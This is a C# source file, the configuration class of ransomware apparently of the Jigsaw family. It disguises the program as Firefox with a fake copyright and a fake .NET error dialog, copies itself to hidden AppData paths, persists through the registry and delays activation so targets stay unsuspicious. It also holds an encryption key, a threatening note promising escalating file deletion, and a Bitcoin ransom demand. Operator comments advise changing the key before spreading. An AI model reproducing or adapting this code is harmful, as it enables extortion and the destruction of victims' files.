using System;
using System.IO;
using Main.Tools;

namespace Main
{
    internal static class Config
    {
        #region Hiding

        /* You want to use a very usual software parameters here,
         * like Firefox, Chrome, AdobeUpdate, etc...
         * This is what the target will see when it checks the running processes.
         * Therefore it shall be not suspicious.
         */
        internal const string AssemblyProdutAndTitle = @"Firefox";
        internal const string AssemblyCopyright =
            @"Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";
        internal const string AssemblyVersion = @"37.0.2.5583";

        // Encrypted files will have this file extension added
        internal const string EncryptionFileExtension = @".fun";

        // Maximum filesize that is going to be encrypted in bytes
        // Default is 10MB, probably anything works
        internal const int MaxFilesizeToEncryptInBytes = 10000000;

        /* Password for encrypting and decrypting encrypted files.
         * Change it to something random, preferably every time before you spread your software
         * Leave the same lenght and don't touch the "==" in the end!
         * (You don't need to remember it.)
         */
        internal const string EncryptionPassword = @"OoIsAwwF23cICQoLDA0ODe==";
        //LULADASILVA

        #endregion
        static Config()
        {
            var appDataRoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var appDataLocalPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            #region Hiding
#if DEBUG
            StartMode = StartModeType.Debug;

            ActiveAfterDateTime = new DateTime(2010, 1, 1);
#else
            StartMode = StartModeType.ErrorMessage;

            /* The software activates itself after the specified date.
             * If the date has already passed it activates immediately.
             * It can be useful when you don't want the targets to be suspicious
             * and tell each other before enough people downloads it
             */
            ActiveAfterDateTime = new DateTime(2016, 1, 1); // year, month, day
#endif
            ErrorMessage = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine +
                ".NET Framework, Version = 4.5.1";
            ErrorTitle = ".NET Framework Initialization Error";

            StartupMethod = Windows.StartupMethodType.Registry;

            /* The software copies here.
             * Examples:
             * @"Adobe (x86)\AcroRd32.exe";
             * @"Google (x86)\Chrome32.exe";
             * @"Drpbx\drpbx.exe";
             * @"Frfx\firefox.exe";
             */
            TempExeRelativePath = @"Drpbx\drpbx.exe";
            FinalExeRelativePath = @"Frfx\firefox.exe";

            FinalExePath = Path.Combine(appDataRoamingPath, FinalExeRelativePath);
            TempExePath = Path.Combine(appDataLocalPath, TempExeRelativePath);

#if DEBUG
            WorkFolderRelativePath = Environment.CurrentDirectory;
#else
            WorkFolderRelativePath = @"System32Work\";
#endif
            WorkFolderPath = Path.Combine(appDataRoamingPath, WorkFolderRelativePath);
            if (!Directory.Exists(WorkFolderPath))
            {
                Directory.CreateDirectory(WorkFolderPath);
            }

            // Set true if you don't want the software to change addresses right away.
            OnlyRunAfterSysRestart = false;
            
            WelcomeMessage = 
            @"I want to play a game with you. Let me explain the rules:" + Environment.NewLine +
            @"Your personal files are being deleted. Your photos, videos, documents, etc..." + Environment.NewLine +
            @"But, don't worry! It will only happen if you don't comply." + Environment.NewLine +
            @"However I've already encrypted your personal files, so you cannot access them." + Environment.NewLine +
            Environment.NewLine +
            @"Every hour I select some of them to delete permanently," + Environment.NewLine +
            @"therefore I won't be able to access them, either." + Environment.NewLine +
            @"Are you familiar with the concept of exponential growth? Let me help you out." + Environment.NewLine +
            @"It starts out slowly then increases rapidly." + Environment.NewLine +
            @"During the first 24 hour you will only lose a few files," + Environment.NewLine +
            @"the second day a few hundred, the third day a few thousand, and so on." + Environment.NewLine +
            Environment.NewLine +
            @"If you turn off your computer or try to close me, when I start next time" + Environment.NewLine +
            @"you will get 1000 files deleted as a punishment." + Environment.NewLine +
            @"Yes you will want me to start next time, since I am the only one that" + Environment.NewLine +
            @"is capable to decrypt your personal data for you." + Environment.NewLine +
            Environment.NewLine +
            @"       Now, let's start and enjoy our little game together!       ";

            // The amount you want for ransom.
            RansomUsd = 23;
            TaskMessage = @"Please, send at least $" + RansomUsd + @" worth of Bitcoin here:";

#endregion
        }

#region Hiding

        internal enum StartModeType
        {
            /// <summary>
            /// Debug message at start. 
            /// Doesn't copy itself anywhere. 
            /// Doesn't start with Windows.
            /// </summary>
            Debug,

            /// <summary>
            /// Shows an error message.
            /// Copies itself to hidden places. 
            /// Starts with Windows.
            /// </summary>
            ErrorMessage,

            /// <summary>
            /// Doesn't show any windows. 
            /// Copies itself to hidden places, don't delete itself. 
            /// Starts with Windows.
            /// </summary>
            NothingHappens,

            /// <summary>
            /// Doesn't show any windows. 
            /// Copies itself to hidden places, then delete itself.
            /// Start with Windows.
            /// </summary>
            DeleteItself
        }
#if DEBUG
        internal static StartModeType StartMode;
#else
        internal static StartModeType StartMode;
#endif
        internal static string ErrorMessage;
        internal static string ErrorTitle;

        internal static Windows.StartupMethodType StartupMethod;
        internal static string TempExeRelativePath;
        internal static string TempExePath;
        internal static string FinalExeRelativePath;
        internal static string FinalExePath;
        internal static string WorkFolderRelativePath;
        internal static string WorkFolderPath;

        internal static bool OnlyRunAfterSysRestart;

        internal static DateTime ActiveAfterDateTime;
        internal static bool Activated = false;
#if DEBUG
        internal static int TimerActivateCheckerInterval = 1000; // Check if activated every sec
#else
        internal static int TimerActivateCheckerInterval = 60*100; // Check if activated every min
#endif

        internal static string WelcomeMessage;
        internal static string TaskMessage;
        internal static int RansomUsd;
#endregion
    }
}
